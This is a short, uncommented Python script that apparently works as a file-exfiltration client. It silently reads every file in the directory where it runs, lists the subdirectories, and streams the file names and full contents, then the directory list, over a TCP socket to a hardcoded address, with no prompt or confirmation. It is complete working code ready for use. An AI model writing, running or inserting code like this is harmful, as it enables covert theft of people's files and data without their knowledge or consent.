import os
import socket
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

files = []
file_data = []
directories = []
cwd = os.getcwd()

for file in os.listdir():
    full_path = os.path.join(cwd, file)
    if os.path.isfile(full_path):
        with open(full_path, "rb") as f:
            content = f.read()
        files.append(file)
        file_data.append((file, content))
    else:
        directories.append(file)

directories_info = f"directories: {directories}".encode()

def send():
    s.connect(("192.168.1.11", 8000))
    time.sleep(1)
    
    for name, content in file_data:
        name_bytes = name.encode()
        s.sendall(len(name_bytes).to_bytes(4, "big"))
        s.sendall(name_bytes)
        s.sendall(len(content).to_bytes(8, "big"))
        s.sendall(content)
        time.sleep(0.5)
    
    s.sendall(len(directories_info).to_bytes(4, "big"))
    s.sendall(directories_info)

send()
s.close()
